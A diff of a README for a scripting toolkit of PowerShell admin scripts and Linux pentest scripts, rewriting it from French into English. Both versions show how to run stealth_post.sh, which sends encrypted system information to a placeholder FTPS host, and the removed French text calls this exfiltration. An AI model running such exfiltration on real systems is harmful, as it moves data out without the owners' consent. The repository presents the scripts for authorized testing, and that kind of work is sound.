@@ -1,134 +1,114 @@
-# PowerShell Scripts Repository
+# Scripting Toolkit
 
-Ce dépôt contient une collection de scripts PowerShell utiles pour l'administration système et l'automatisation de tâches courantes.
+[![Script Validation](https://github.com/Tibo2403/Scripting/actions/workflows/script-validation.yml/badge.svg)](https://github.com/Tibo2403/Scripting/actions/workflows/script-validation.yml)
 
-## Table des matières
+Collection of PowerShell and Bash scripts for system administration, security checks, Microsoft 365 operations, Linux dependency checks, and authorized lab or pentest workflows.
 
-- [⚠️ Avertissements légaux](#-avertissements-légaux)
-- [📂 Structure du dépôt](#-structure-du-dépôt)
-- [🛠️ Prérequis / Prerequisites](#-prérequis--prerequisites)
-- [📦 Installation](#-installation)
-- [📚 Exemples d'utilisation](#-exemples-dutilisation)
-- [License](#license)
+## Legal Notice
 
-## ⚠️ Avertissements légaux
+Use the pentest scripts only on systems where you have explicit written authorization. Unauthorized scanning, exploitation, credential access, or data transfer can be illegal and harmful.
 
-Pentest scripts (dont `pentest_discovery.sh`, `pentest_verification.sh`, `pentest_exploitation.sh`) et `stealth_post.sh` doivent être utilisés uniquement sur des systèmes pour lesquels vous disposez d'une autorisation explicite.
+The scripts in `scripts/linux/pentest_*.sh`, `scan_wifi.sh`, and `stealth_post.sh` are intended for controlled labs, training environments, or sanctioned security assessments.
 
-Pentest scripts and `stealth_post.sh` must only be run on systems where you have been granted explicit permission. Unauthorized use may be illegal.
+## Repository Structure
 
-## 📂 Structure du dépôt
-
-```
+```text
 scripts/
-├── linux/             # Scripts Bash pour Linux
+├── linux/
 │   ├── check_dependencies.sh
-│   ├── setup_api.sh
+│   ├── dependencies.conf
 │   ├── pentest_discovery.sh
 │   ├── pentest_verification.sh
 │   ├── pentest_exploitation.sh
 │   ├── scan_wifi.sh
+│   ├── setup_api.sh
 │   └── stealth_post.sh
-├── powershell/        # Scripts PowerShell pour Windows
-│   ├── DiskUsageReport.ps1
-│   ├── Get-SystemInfo.ps1
-│   ├── ManageServices.ps1
-│   ├── VMManagement.ps1
-│   ├── LinkCrawler.ps1
-│   ├── TeamsManagement.ps1
-│   ├── SharePointManagement.ps1
-│   ├── UserManagement.ps1
-│   └── SecurityCheck.ps1
-├── sample_logs.json   # Journalisation fictive pour tests
+└── powershell/
+    ├── DiskUsageReport.ps1
+    ├── ExchangeOnlineManagement.ps1
+    ├── Get-SystemInfo.ps1
+    ├── LinkCrawler.ps1
+    ├── ManageServices.ps1
+    ├── SecurityCheck.ps1
+    ├── SharePointManagement.ps1
+    ├── TeamsManagement.ps1
+    ├── Test-ScriptSyntax.ps1
+    ├── UserManagement.ps1
+    └── VMManagement.ps1
 ```
 
-Le fichier `targets.txt` à la racine contient la liste des cibles pour les scripts de pentest. Les scripts Bash utilisent un chemin relatif basé sur leur propre emplacement pour le retrouver, ce qui permet de les lancer depuis n'importe quel répertoire.
+`targets.txt` contains example targets used by the pentest scripts. Keep it limited to systems that you are allowed to test.
 
-## 🛠️ Prérequis / Prerequisites
+## Prerequisites
 
-- **Outils / Tools** : `nmap`, `gvm-cli` et les modules PowerShell nécessaires (Hyper-V, ExchangeOnlineManagement, Teams, etc.).
-- **Privilèges / Privileges** : certains scripts exigent des droits administrateur ou root.
+- PowerShell 5.1+ or PowerShell 7+ for Windows scripts.
+- Linux shell tools for Bash scripts.
+- Optional tools depending on the script: `nmap`, `gvm-cli`, `curl`, `gpg`, `pwsh`.
+- Optional PowerShell modules: Hyper-V, ExchangeOnlineManagement, MicrosoftTeams, PnP.PowerShell.
+- Administrator or root privileges for scripts that manage services, users, VMs, network scans, or security settings.
 
-## 📦 Installation
+## Quick Checks
 
-```bash
-# Installation de l'API Mistral
-# Le script télécharge install.sh séparément et vérifie son empreinte SHA-256
-bash scripts/linux/setup_api.sh
-# Activer l'environnement virtuel puis lancer l'API
-source /opt/mistral-env/bin/activate
-python ~/mistral_api.py
-```
-
-## 📚 Exemples d'utilisation
-
-Les scripts peuvent être lancés via PowerShell :
+Validate PowerShell syntax:
 
 ```powershell
-# Exemple : afficher les informations système
-.\scripts\powershell\Get-SystemInfo.ps1
-
-# Exemple : vérifier l'état d'un service
-.\scripts\powershell\ManageServices.ps1 -Action status -ServiceName spooler
-
-# Exemple : lister les machines virtuelles Hyper-V
-.\scripts\powershell\VMManagement.ps1 -Action list
-
-# Exemple : démarrer une machine virtuelle
-.\scripts\powershell\VMManagement.ps1 -Action start -VMName "TestVM"
-# Exemple : lister les equipes Teams
-.\scripts\powershell\TeamsManagement.ps1 -Action list
-# Exemple : créer un canal Teams
-.\scripts\powershell\TeamsManagement.ps1 -Action createchannel -TeamName "Marketing" -ChannelName "Général"
-# Exemple : ajouter plusieurs membres depuis un CSV
-.\scripts\powershell\TeamsManagement.ps1 -Action bulkadd -TeamName "Marketing" -CsvPath .\users.csv
-# Exemple : lister les boîtes aux lettres Exchange Online
-.\scripts\powershell\ExchangeOnlineManagement.ps1 -Action list
-# Exemple : lister les sites SharePoint Online
-.\scripts\powershell\SharePointManagement.ps1 -Mode Online -Action ListSites -Credential (Get-Credential)
-# Exemple : créer un site SharePoint On-Premise
-.\scripts\powershell\SharePointManagement.ps1 -Mode OnPrem -Action CreateSite -SiteUrl "http://spserver/sites/test" -Template STS#0 -Credential (Get-Credential)
-# Exemple : vérifier les paramètres de sécurité
-.\scripts\powershell\SecurityCheck.ps1
+.\scripts\powershell\Test-ScriptSyntax.ps1 -Path .\scripts\powershell
 ```
-> **Note :** `ManageServices.ps1` et `UserManagement.ps1` doivent être exécutés dans une session PowerShell élevée.
-> **Exemple :** cherchez "PowerShell" dans le menu Démarrer, faites un clic droit puis sélectionnez "Exécuter en tant qu'administrateur".
 
-Chacun des scripts possède des paramètres décrits en début de fichier.
-
-### Scripts Kali Linux
+Validate Bash syntax from Linux, WSL, Git Bash, or CI:
 
 ```bash
+find scripts/linux -name "*.sh" -print0 | xargs -0 -n1 bash -n
+```
 
-# Vérifier les dépendances nécessaires
+Check Linux dependencies:
+
+```bash
 bash scripts/linux/check_dependencies.sh
+```
 
-# Phase de découverte (scan complet et scripts de vulnérabilités)
+## PowerShell Examples
+
+```powershell
+.\scripts\powershell\Get-SystemInfo.ps1
+.\scripts\powershell\ManageServices.ps1 -Action status -ServiceName spooler
+.\scripts\powershell\VMManagement.ps1 -Action list
+.\scripts\powershell\TeamsManagement.ps1 -Action list
+.\scripts\powershell\ExchangeOnlineManagement.ps1 -Action list
+.\scripts\powershell\SecurityCheck.ps1
+```
+
+`ManageServices.ps1` and `UserManagement.ps1` require an elevated PowerShell session for privileged actions.
+
+## Linux Examples
+
+```bash
+bash scripts/linux/check_dependencies.sh
 bash scripts/linux/pentest_discovery.sh
-# Phase de vérification des vulnérabilités
 bash scripts/linux/pentest_verification.sh
-# Phase d'exploitation (si autorisée)
 bash scripts/linux/pentest_exploitation.sh
-# Génère un fichier de suggestions avec searchsploit si des CVE ont été détectées
-# Exfiltration basique via FTPS (si autorisée)
-export FTP_USER="utilisateur"
-export FTP_PASS="motdepasse"
-export FTP_HOST="exemple.com"
+```
+
+For `stealth_post.sh`, pass credentials through environment variables or a local config file that is never committed:
+
+```bash
+export FTP_USER="user"
+export FTP_PASS="password"
+export FTP_HOST="example.com"
 export FTP_PATH="uploads/sysinfo.txt.gpg"
-export GPG_PASSPHRASE="phrase_secrete"
+export GPG_PASSPHRASE="secret_passphrase"
 bash scripts/linux/stealth_post.sh
 ```
 
-### Configuration de l'hôte distant
+## CI
 
-- Serveur FTP avec prise en charge de FTPS (TLS explicite).
-- Compte utilisateur autorisé à écrire dans le chemin indiqué par `$FTP_PATH`.
-- Pour récupérer les données, télécharger le fichier chiffré puis le déchiffrer :
-  `gpg --batch --passphrase "phrase_secrete" -o sysinfo.txt -d sysinfo.txt.gpg`.
+The `script-validation.yml` workflow checks:
 
-Chaque exécution de `pentest_discovery.sh` crée un sous-dossier horodaté dans `pentest_results`, conservant les résultats des scans précédents.
-Each run of `pentest_discovery.sh` outputs to a timestamped subfolder inside `pentest_results`, preserving previous scan results.
- 
+- PowerShell syntax for every `.ps1`, `.psm1`, and `.psd1` file.
+- Bash syntax for every Linux shell script.
+
+The AI refactor workflow is manual-only to avoid surprise API usage and automatic hourly write attempts.
+
 ## License
 
 This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
